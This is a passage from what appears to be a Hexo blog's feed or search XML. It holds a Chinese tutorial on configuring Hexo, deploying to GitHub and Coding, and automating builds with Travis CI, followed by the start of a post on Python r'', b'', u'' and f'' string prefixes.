class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span>  </span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;*.min.css&#x27;</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;*.min.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">0pt1mus</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">不温不火，不急不躁，了解hows背后的whys</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">文化水平不够可以读，为人处世不同可以学，钱没有可以赚，唯独你的内心必须坚定，你要不断努力，并且相信你自己绝对是一个有价值，值得被尊重和喜欢的人。</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">0pt1mus</span></span><br><span class="line"><span class="attr">email:</span> <span class="number">1040570917</span><span class="string">@qq.com</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/images/avatar.jpg</span></span><br><span class="line"><span class="comment"># search: 59fe6eea70113d77622d1c85f2aeb87a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://superj.site/</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:id/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">Butterfly</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jsonContent:</span></span><br><span class="line">  <span class="attr">dateFormat:</span> <span class="string">DD/MM/YYYY</span></span><br><span class="line">  <span class="attr">posts:</span></span><br><span class="line">    <span class="attr">title:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">date:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">path:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">text:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">raw:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">content:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">slug:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">updated:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">link:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">permalink:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">excerpt:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">author:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sitemap:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">sitemap.xml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">baidusitemap:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">baidusitemap.xml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"> <span class="comment"># - type: git</span></span><br><span class="line"> <span class="comment">#   repository: git@github.com:overoptimus/overoptimus.github.io.git</span></span><br><span class="line"> <span class="comment">#   branch: master</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> </span><br><span class="line">      <span class="attr">coding:</span> <span class="string">git@e.coding.net:overoptimus/overoptimus.git</span></span><br><span class="line">      <span class="attr">github:</span> <span class="string">git@github.com:overoptimus/overoptimus.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h1 id="发布到github和coding"><a href="#发布到github和coding" class="headerlink" title="发布到github和coding"></a>发布到github和coding</h1><p>目前我们只能在本地访问到我们的博客，现在我们将博客托管到github和coding中。</p><h5 id="第一步，注册github和coding的账号"><a href="#第一步，注册github和coding的账号" class="headerlink" title="第一步，注册github和coding的账号"></a>第一步，注册github和coding的账号</h5><h5 id="第二步，创建仓库"><a href="#第二步，创建仓库" class="headerlink" title="第二步，创建仓库"></a>第二步，创建仓库</h5><p>注册登录后，在首页可发现<code>new repository</code>，新建一个仓库。</p><p><code>github</code>创建名字为<code>username.github.io</code>的仓库，比如我的用户名为<code>overoptimus</code>，我的仓库名为<code>overoptimus.github.io</code>。</p><p><code>coding</code>创建名字为<code>username</code>的仓库，比如我的用户名为<code>overoptimus</code>，我的仓库名为<code>overoptimus</code>。</p><blockquote><p>注：coding的仓库名可以为任意</p></blockquote><h5 id="第三步，生成ssh添加到github和coding"><a href="#第三步，生成ssh添加到github和coding" class="headerlink" title="第三步，生成ssh添加到github和coding"></a>第三步，生成ssh添加到github和coding</h5><p>在本地命令行中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>这里的<code>yourname</code>和<code>youremail</code>是你在注册时的用户名和邮箱。</p><p>可通过以下命令检查是否配置正确。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><p>然后生成ssh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>这时就会提示你在ssh生成在什么位置，我是在mac环境下，是在<code>~/.ssh</code>下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── id_rsa</span><br><span class="line">├── id_rsa.pub</span><br></pre></td></tr></table></figure><p>可发现其中有两个文件，<code>id_rsa</code>是秘钥，<code>id_rsa.pub</code>是公钥。我们需要将公钥的内容保存在<code>github</code>和<code>codig</code>中。在网站的setting中可以找到设置ssh的选项。</p><h5 id="第四部，安装通过git部署的插件"><a href="#第四部，安装通过git部署的插件" class="headerlink" title="第四部，安装通过git部署的插件"></a>第四部，安装通过git部署的插件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><blockquote><p>注：以下若无特殊声明，均在myblog目录下。</p></blockquote><h5 id="第四步，修改-config-yml"><a href="#第四步，修改-config-yml" class="headerlink" title="第四步，修改_config.yml"></a>第四步，修改_config.yml</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> </span><br><span class="line">      <span class="attr">coding:</span> <span class="string">git@e.coding.net:overoptimus/overoptimus.git</span></span><br><span class="line">      <span class="attr">github:</span> <span class="string">git@github.com:overoptimus/overoptimus.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>将最后的<code>deploy</code>修改为上面的样子，注意其中的链接是你的仓库的链接。</p><h5 id="第五步，发布到github和coding"><a href="#第五步，发布到github和coding" class="headerlink" title="第五步，发布到github和coding"></a>第五步，发布到github和coding</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h5 id="第六步，在github和coding中打开web服务。"><a href="#第六步，在github和coding中打开web服务。" class="headerlink" title="第六步，在github和coding中打开web服务。"></a>第六步，在github和coding中打开web服务。</h5><p>分别进入github和coding的仓库中，打开设置页，github是<code>github pages</code>，coding是构建与部署中的<code>静态网站</code>。</p><p>之后就可以通过<code>https://overoptimus.github.io/</code>和coding提示的网址访问我们的网站。</p><h5 id="第七步，配置个性域名"><a href="#第七步，配置个性域名" class="headerlink" title="第七步，配置个性域名"></a>第七步，配置个性域名</h5><p>首先要购买一个域名，可以在阿里云购买，也可以在<code>GoDaddy</code>中购买。</p><p>然后在解析中，添加<code>CNAME</code>类型的解析指向github和coding的网址。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200222235720.png" style="zoom:50%;"><p>再添加一条记录为<code>www</code>的记录。</p><p>然后我们再添加两条记录，路线选择境外，记录还是<code>www</code>和<code>@</code>，记录值为我们的github pages的网址，我的即为<code>overoptimus.github.io</code>。</p><p>之后我们可以通过自己的域名访问我们的博客。</p><h1 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h1><p>从搭建博客到现在也更换过了好几个主题，有<code>next</code>、<code>pure</code>、<code>butterfly</code>。</p><p>现在使用的是<code>butterfly</code>，配置情况可以参考下面的网址，很详细，按着配置下来就可以了。</p><p><a href="https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B">Butterfly</a></p><h1 id="开始写博客"><a href="#开始写博客" class="headerlink" title="开始写博客"></a>开始写博客</h1><p>到现在我们可以开始写博客了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;文章名&quot;</span><br></pre></td></tr></table></figure><p>在博客的目录下，也就是myblog下，输入上述命名，可以在<code>source/_post</code>下生成<code>文章名.md</code>的文件，然后我们编辑该文件，书写文章就可以，<code>markdown</code>的语法网上有很多教程，百度一下学习吧。</p><p>每次写完之后，进行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>这样就可以将你的博客发布上去了。</p><h1 id="配置trivas实现自动部署博客到github和coding"><a href="#配置trivas实现自动部署博客到github和coding" class="headerlink" title="配置trivas实现自动部署博客到github和coding"></a>配置trivas实现自动部署博客到github和coding</h1><p>我们在写博客的过程中，每次写了一篇文章后，就要执行重复的命令去将生成博客，然后推送到<code>github</code>和<code>coding</code>，并且我们也会需要将源码进行一个备份，如果我们备份在硬盘里，每次写完文章都需要去更新硬盘中的文件，会比较麻烦。下面我介绍通过<code>trivas</code>同时实现博客的备份和自动化部署。</p><p>首先我们在github中创建一个名为<code>hexo-source</code>的仓库。然后在本地执行以下命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://github.com/overoptimus/hexo-source.git //这里要修改为你自己的仓库地址</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>将本地的<code>hexo</code>源码推送到远端的仓库。</p><p>然后打开<code>trivas</code>官网。</p><p>通过github的账户进行登录，然后开启<code>hexo-source</code>的<code>services integration</code>服务。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200223153544.png"></p><p>点击setting添加<code>Environment Variables</code>，<code>name</code>可以自己命名，<code>value</code>添加<code>github</code>和<code>coding</code>生成的访问令牌，生成的位置<code>github</code>在settings-&gt;developer settings-&gt;personal access tokens，<code>coding</code>在个人设置-&gt;访问令牌。权限选择选择完整的仓库读写。</p><p>然后在本地的博客目录，即<code>myblog</code>下，创建<code>.trivas.yml</code>文件，内容如下。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span> <span class="comment"># 设置语言</span></span><br><span class="line"></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span> <span class="comment"># 设置相应版本</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">    <span class="attr">apt:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">directories:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">node_modules</span> <span class="comment"># 设置缓存，传说会在构建的时候快一些</span></span><br><span class="line"></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line">    <span class="attr">depth:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">export</span> <span class="string">TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="comment"># 安装hexo及插件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="comment"># 清除</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">g</span> <span class="comment"># 生成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line">    <span class="comment"># - git clone https://$&#123;GH_REF&#125; pub_web # 因为我有两个仓库，先将发布服务的仓库clone下来，</span></span><br><span class="line">    <span class="comment"># - cp -rf public/* pub_web/ # 将源博客仓库(blog.git)目录下的public文件夹下的文件复制到发布服务的仓库(chenzhijun.github.com.git)中</span></span><br><span class="line">    <span class="comment"># - cd pub_web # 进入到git仓库</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">&quot;overoptimus&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">&quot;1040570917@qq.com&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">commit</span> <span class="string">-am</span> <span class="string">&quot;Travis CI Auto Builder :$(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;)&quot;</span> <span class="comment"># 零时区，+8小时</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">push</span> <span class="string">--force</span> <span class="string">--quiet</span> <span class="string">&quot;https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;&quot;</span> <span class="string">master:master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">git</span> <span class="string">push</span> <span class="string">--force</span> <span class="string">--quiet</span> <span class="string">&quot;https://EBlvrRYUzD:$&#123;CD_TOKEN&#125;@$&#123;CD_REF&#125;&quot;</span> <span class="string">master:master</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">    <span class="attr">only:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">master</span> <span class="comment">#只监测master分支,这是我自己的博客，所以就用的master分支了。</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line">    <span class="attr">global:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">GH_REF:</span> <span class="string">github.com/overoptimus/overoptimus.github.io.git</span> <span class="comment">#设置GH_REF，注意更改yourname,GITHUB_TOKEN:就是我们在travis-ci仓库中配置的环境变量</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">GITHUB_TOKEN:</span> <span class="string">&quot;$&#123;github_token&#125;&quot;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">CD_REF:</span> <span class="string">e.coding.net/overoptimus/overoptimus.git</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">CD_TOKEN:</span> <span class="string">&quot;$&#123;cd_token&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>注意其中的一些位置要改成你自己的信息，特别注意在推送到<code>coding</code>的地址中<code>https://</code>后接的一串字符是在你创建<code>coding</code>的访问令牌时的页面中提示你的。且其中${xx_token}是与你在<code>Environment Variable</code>中的<code>name</code>是一致的。</p><p>现在设置已经完成，将本地的更改推送到远程仓库，然后就会在trivas的网站中发现，开始自动部署了。过一会儿你就访问你的博客，发现已经更新了。</p><p>然后你就会发现，你可以在任意的地方，即使没有<code>git</code>、<code>node.js</code>的环境，你在源码仓库进行更改并提交后，<code>trivas</code>就可以帮助你将更新后的内容同步到你的博客中。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>现在你就可以很方便、优雅的书写自己的博客文章了，如果你并不喜欢<code>butterfly</code>这个主题，你也可以百度一下，寻找你自己的最爱。</p><p>希望这篇文章能够对你有所帮助。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python下r&#39;&#39;、b&#39;&#39;、f&#39;&#39;、u&#39;&#39;</title>
      <link href="2020/02/18/20200218173211/"/>
      <url>2020/02/18/20200218173211/</url>
      
        <content type="html"><![CDATA[<h1 id="r’’"><a href="#r’’" class="headerlink" title="r’’"></a>r’’</h1><p>转义字符以原样输出，不做转义字符识别。如<code>\n</code>，输出<code>\n</code>，不是换行符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">r&#x27;hahahahahahaha\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200218175337.png" style="zoom:50%;"><p>可以发现原样输出了<code>\n</code>。</p><h1 id="b’’"><a href="#b’’" class="headerlink" title="b’’"></a>b’’</h1><p>这里有python2和python3的区别。</p><p>在python3中，字符串的类型有<code>str</code>和<code>bytes</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;111&#x27;</span></span><br><span class="line"><span class="built_in">type</span>(a)</span><br><span class="line"><span class="comment"># 输出str</span></span><br><span class="line"><span class="built_in">type</span>(a.encode())</span><br><span class="line"><span class="comment"># 输出bytes</span></span><br><span class="line"><span class="built_in">type</span>(a.decode())</span><br><span class="line"><span class="comment"># 输出str没有decode的方法</span></span><br></pre></td></tr></table></figure><p>在python2中，字符串的类型有<code>str</code>和<code>unicode</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;111&#x27;</span></span><br><span class="line"><span class="built_in">type</span>(a)</span><br><span class="line"><span class="comment"># 输出str</span></span><br><span class="line"><span class="built_in">type</span>(a.encode())</span><br><span class="line"><span class="comment"># 输出str</span></span><br><span class="line"><span class="built_in">type</span>(a.decode())</span><br><span class="line"><span class="comment"># 输出unicode</span></span><br></pre></td></tr></table></figure><p>我们可以发现，python2中的str就是python3中的str.encode()后的，而python3中的str就是python2中str.decode()后的。也就是说，在两个版本中默认的str有如下关系。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200218182318.png" style="zoom:50%;"><p>因此，在python3中，<code>b&#39;111&#39;</code>等同于<code>&#39;111&#39;.encode()</code>。</p><h1 id="u’’"><a href="#u’’" class="headerlink" title="u’’"></a>u’’</h1><p>表示该字符串是unicode编码的，python3的默认编码方式就是unicode。</p><blockquote><p>这里要说一下，unicode是一种标准，是字符集，符合这一标准的编码方式有utf-8、utf-16、utf-32等。</p></blockquote><h1 id="f’’"><a href="#f’’" class="headerlink" title="f’’"></a>f’’</h1><p>格式化字符串的输入方式，见下面的例子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 